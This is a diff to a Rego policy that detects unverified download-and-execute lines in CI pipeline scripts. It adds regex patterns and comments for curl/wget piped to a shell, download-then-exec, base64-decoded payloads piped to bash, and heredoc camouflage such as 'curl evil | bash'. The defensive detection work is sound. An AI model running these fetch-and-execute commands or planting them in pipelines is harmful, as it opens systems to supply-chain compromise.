@@ -1,12 +1,17 @@
-# unverified-scripts — flag pipeline scripts that download and execute
-# remote code without integrity verification. The classic offender is
-# the `curl ... | bash` pattern, a well-known supply-chain attack
-# vector: a single compromise of the upstream URL turns the pipeline
-# into an attacker-controlled payload.
+# unverified-scripts — flag pipeline scripts that download or inline
+# executable content without integrity verification. Classic vectors
+# include `curl ... | bash`, download-then-exec, redirect-to-file-then-
+# exec, Megalodon-style `echo "..." | base64 -d | bash`, and any
+# command piped into a shell without verification.
 #
-# The policy currently matches the "pipe-to-shell" shape. Other unsafe
-# patterns (download-and-exec, download-redirect-exec) can be added
-# incrementally.
+# False-positive guards: the pattern check operates on the line with
+# quoted substrings stripped, so a `| bash` that sits inside a string
+# literal (an `echo` of installation instructions, a comment in a
+# heredoc body) does not trigger. The heredoc-marker skip is scoped
+# to the generic `| <shell>` pattern only, so a heredoc marker on the
+# same line as a curl/wget/base64 download (`curl evil | bash <<EOF`)
+# does NOT shield it from detection — the operator-intent argument
+# only holds when the line itself isn't fetching external content.
 #
 # Lines that include a checksum / signature verification command on
 # the same line (sha256sum, shasum, gpg --verify, cosign verify, …)
@@ -15,12 +20,21 @@ package unverified_scripts
 
 import rego.v1
 
+# Shell interpreters commonly used as pipe targets in CI attacks.
+_shell := `bash|sh|zsh|python[23]?|perl|ruby|dash|ksh`
+
 deny contains finding if {
 	some i, j
 	job := input.pipeline.jobs[i]
 	line := job.scripts[j]
-	regex.match(`(?i)(curl|wget)\s+[^|]*\|\s*(sudo\s+)?(bash|sh|zsh|python[23]?|perl|ruby)\b`, line)
-	not _line_is_verified(line)
+	visible := _visible_line(line)
+	_unsafe_script_line(visible, line)
+	# Verification keyword check runs on the stripped line so an
+	# attacker can't bypass the rule by putting `sha256sum` /
+	# `cosign verify` inside a quoted string ("must sha256sum first").
+	# The trust-URL check stays on the raw line because URLs are often
+	# legitimately quoted in shell commands.
+	not _line_is_verified(visible)
 	not _line_is_trusted(line)
 	finding := {
 		"code":       "ISSUE-411",
@@ -29,6 +43,58 @@ deny contains finding if {
 		"job":        job.name,
 		"scriptLine": line,
 	}
+}
+
+# Strip quoted substrings (double then single quotes) so a pipe-to-
+# shell that sits entirely inside a string literal does not match.
+_visible_line(line) := stripped if {
+	once := regex.replace(line, `"[^"]*"`, "")
+	stripped := regex.replace(once, `'[^']*'`, "")
+}
+
+# Heredoc on the same line — `cat <<EOF | bash`, `<<-EOF`, `<<'EOF'`,
+# `<< "EOF"`. The pipe target is operator-authored, in-tree content,
+# not an externally-sourced payload; any unsafe download inside the
+# body still fires on its own script line.
+_has_heredoc(line) if {
+	regex.match(`<<-?\s*['"]?\w+`, line)
+}
+
+# Patterns 1–4 fetch external content on the same line as the pipe,
+# so a heredoc marker on the line does not shield them: an attacker
+# putting `curl evil | bash <<EOF` is still doing a remote pipe-to-
+# shell, the heredoc is just camouflage.
+
+# curl|wget piped directly into a shell (classic supply-chain vector).
+_unsafe_script_line(visible, _) if {
+	regex.match(sprintf(`(?i)(curl|wget)\s+[^|&;\n]*\|\s*(sudo\s+)?(%s)\b`, [_shell]), visible)
+}
+
+# Download then execute on the same line (curl -o … && bash, etc.).
+_unsafe_script_line(visible, _) if {
+	regex.match(sprintf(`(?i)(curl|wget)\s+[^&;\n]*&&\s*(sudo\s+)?(%s)\b`, [_shell]), visible)
+}
+
+# Download to a file then execute (; or &&).
+_unsafe_script_line(visible, _) if {
+	regex.match(sprintf(`(?i)(curl|wget)\s+[^;\n]*(?:>\s*\S+|-o\s+\S+)[^;\n]*(?:;|&&)\s*(sudo\s+)?(%s)\b`, [_shell]), visible)
+}
+
+# Inline obfuscated payload (Megalodon: echo "…" | base64 -d | bash).
+# The base64 blob gets stripped along with its quotes, but `echo  |
+# base64 -d | bash` still matches because the rest of the chain is on
+# the visible side of the quotes.
+_unsafe_script_line(visible, _) if {
+	regex.match(sprintf(`(?i)(echo|printf)\s+[^|]*\|\s*base64\s+(-d|--decode)\s*\|\s*(sudo\s+)?(%s)\b`, [_shell]), visible)
+}
+
+# Generic `<anything> | <shell>` catch-all. Skipped on heredoc-marker
+# lines because `cat <<EOF | bash` is in-tree operator-authored content
+# — but only when the line isn't ALSO matching one of the more specific
+# patterns above (those run regardless of heredoc presence).
+_unsafe_script_line(visible, line) if {
+	not _has_heredoc(line)
+	regex.match(sprintf(`(?i)\|\s*(sudo\s+)?(%s)\b`, [_shell]), visible)
 }
 
 _line_is_verified(line) if {
